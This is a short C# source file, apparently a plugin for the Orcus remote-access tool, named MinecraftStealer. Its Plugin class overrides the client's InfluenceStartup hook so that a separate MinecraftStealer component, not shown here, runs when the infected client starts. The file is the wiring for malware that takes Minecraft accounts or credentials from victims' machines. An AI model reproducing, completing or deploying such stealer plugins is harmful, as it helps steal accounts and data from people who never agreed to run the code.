using Orcus.Plugins;

namespace MinecraftStealer
{
    public class Plugin : ClientController
    {
        private MinecraftStealer _minecraftStealer;

        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            _minecraftStealer = new MinecraftStealer();
            return _minecraftStealer.InfluenceStartup(clientStartup);
        }
    }
}